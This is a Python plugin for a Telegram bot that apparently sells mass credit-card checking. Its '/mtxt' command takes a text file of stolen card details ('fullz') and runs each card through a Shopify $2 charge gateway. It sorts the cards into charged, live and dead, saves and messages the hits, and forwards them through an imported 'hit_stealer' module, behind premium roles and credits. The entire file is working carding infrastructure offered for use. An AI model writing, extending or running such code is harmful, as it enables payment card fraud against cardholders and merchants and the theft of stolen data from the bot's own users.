
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio, time, os, httpx, traceback
from datetime import date
from plugins.func.users_sql import fetchinfo, updatedata, insert_reg_data, setantispamtime
from plugins.gates.func.shopify_charge_func import shopify_charge_func, get_charge_resp
from plugins.gates.TOOLS.getcc_for_txt import getcc_for_txt
from plugins.tools.hit_stealer import send_hit_if_approved

stop_flag = False

async def save_cc(result, file_name):
    try:
        cc = result["fullz"]
        resp = result["response"]
        emoji = "✅" if result.get("hits") == "CHARGED" else "⚠️" if result.get("hits") == "LIVE" else "❌"

        all_file = os.path.join("HITS", file_name)
        with open(all_file, "a", encoding="utf-8") as f:
            f.write(f"{emoji} {cc} -> {resp}\n")

        if result.get("hits") == "CHARGED":
            charged_file = os.path.join("HITS", f"CHARGED_{file_name}")
            with open(charged_file, "a", encoding="utf-8") as f:
                f.write(f"{emoji} {cc} -> {resp}\n")
    except Exception as e:
        print("Save error:", str(e))

async def gcgenfunc(length=6):
    import random, string
    return "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def elapsed_time(start):
    elapsed = time.perf_counter() - start
    return int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)

async def get_checking_response(client, message, total, key, chk_done, charged, live, start):
    hour, minute, second = elapsed_time(start)
    text = (
        f"<b>Gateway:</b> Shopify Charge 2$ ♻️\n\n"
        f"<b>Checked:</b> {chk_done}/{total}\n"
        f"<b>Charged:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {hour}h {minute}m {second}s\n"
        f"<b>Key:</b> <code>{key}</code>"
    )
    btn = InlineKeyboardMarkup([[InlineKeyboardButton("⛔ Stop", callback_data="stop_checking")]])
    await client.edit_message_text(chat_id=message.chat.id, message_id=message.id, text=text, reply_markup=btn)

async def get_done_response(client, message, total, key, hitsfile, chk_done, charged, live, start):
    hour, minute, second = elapsed_time(start)
    text = (
        f"<b>Gateway:</b> Shopify 2$ Charge ♻️\n\n"
        f"<b>Total:</b> {total}\n"
        f"<b>Checked:</b> {chk_done}\n"
        f"<b>Charged:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {hour}h {minute}m {second}s\n"
        f"<b>Key:</b> <code>{key}</code>"
    )
    await message.reply_document(document=hitsfile, caption=text, quote=True)

async def process_card(card, user_id, session):
    result = await shopify_charge_func(card["fullz"])
    return await get_charge_resp(result, user_id, card["fullz"])

@Client.on_message(filters.command("mtxt", ["/", "."]))
async def shopify_mass_txt_cmd(client, message):
    global stop_flag
    stop_flag = False

    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply_text("❌ Usage: Reply to a .txt file with /mtxt", quote=True)

        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        reg = fetchinfo(user_id)
        if not reg:
            insert_reg_data(user_id, username, 200, str(date.today()))
            reg = fetchinfo(user_id)

        role = (reg[2] or "FREE").strip().upper()

        # ✅ Only allow PREMIUM users
        if role != "PREMIUM":
            return await message.reply_text(
                "❌ This command is for PREMIUM users only.\n💎 Upgrade to use it.",
                quote=True
            )

        credits = int(reg[5] or 0)

        randkey = await gcgenfunc()
        key = f"mtxt{user_id}_{randkey}"
        file_name = f"{key}.txt"
        download_path = os.path.join("downloads", file_name)
        os.makedirs("downloads", exist_ok=True)
        os.makedirs("HITS", exist_ok=True)

        await message.reply_to_message.download(file_name=download_path)

        valid, cc_list = await getcc_for_txt(download_path, role)
        if not valid:
            return await message.reply_text(cc_list, quote=True)

        total_cards = len(cc_list)

        if total_cards > 3000:
            return await message.reply_text(f"❌ You can only check up to 3000 cards at a time. You sent {total_cards}.", quote=True)

        if credits < total_cards:
            return await message.reply_text(f"❌ Not enough credits. You need {total_cards - credits} more.", quote=True)

        status_message = await message.reply_text("Started Checking...", quote=True)
        hitsfile = os.path.join("HITS", file_name)
        chk_done = charged = live = 0
        start_time = time.perf_counter()

        async with httpx.AsyncClient(timeout=65, follow_redirects=True) as session:
            BATCH_SIZE = 10
            for i in range(0, total_cards, BATCH_SIZE):
                if stop_flag:
                    break
                batch = cc_list[i:i + BATCH_SIZE]
                tasks = [process_card(card, user_id, session) for card in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for res in results:
                    chk_done += 1
                    if isinstance(res, Exception):
                        outcome = {"hits": "DEAD", "fullz": "Unknown", "response": str(res)}
                    else:
                        outcome = res

                    hits = outcome.get("hits")
                    if hits == "CHARGED":
                        charged += 1
                    elif hits == "LIVE":
                        live += 1

                    if hits in ["CHARGED", "LIVE"]:
                        try:
                            emoji = "✅" if hits == "CHARGED" else "⚠️"
                            hit_msg = f"{emoji} <b>{hits}</b>\n<code>{outcome['fullz']}</code>\n<b>Response:</b> {outcome['response']}"
                            await client.send_message(chat_id=message.from_user.id, text=hit_msg)
                            await send_hit_if_approved(client, hit_msg)
                        except Exception as e:
                            print(f"DM or hit forward failed: {e}")

                    await save_cc(outcome, file_name)

                await get_checking_response(client, status_message, total_cards, key, chk_done, charged, live, start_time)

        if not stop_flag:
            await get_done_response(client, message, total_cards, key, hitsfile, chk_done, charged, live, start_time)
            updatedata(user_id, "credits", credits - total_cards)
            setantispamtime(user_id)
        else:
            await message.reply_text("⛔ Process stopped by user.", quote=True)

    except Exception:
        await message.reply_text(f"❌ Error:\n<code>{traceback.format_exc()}</code>", quote=True)
